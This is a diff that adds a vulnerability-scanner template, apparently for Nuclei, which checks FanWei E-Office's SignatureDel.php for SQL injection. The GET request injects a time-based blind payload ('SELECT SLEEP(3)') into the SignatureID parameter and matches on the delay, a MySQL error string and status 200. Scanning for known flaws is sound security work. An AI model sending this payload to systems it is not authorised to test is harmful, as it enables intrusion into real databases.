@@ -1,0 +1,29 @@
+id: FanWeiEOffice_SignatureDel-SqlInjection
+
+info:
+  name: FanWeiEOffice_SignatureDel-SqlInjection
+  author: iSee857
+  severity: high
+  description: FanWeiEOffice_SignatureDel-SqlInjection
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /iWebOffice/Signature/SignatureDel.php?SignatureID=1+AND+(SELECT+7431+FROM+(SELECT(SLEEP(3)))LtXU) HTTP/1.1
+        Host: {{Host}}
+      
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 3"
+
+      - type: word
+        part: body
+        words:
+          - "mysql_fetch_array"
+
+      - type: status
+        status:
+          - 200
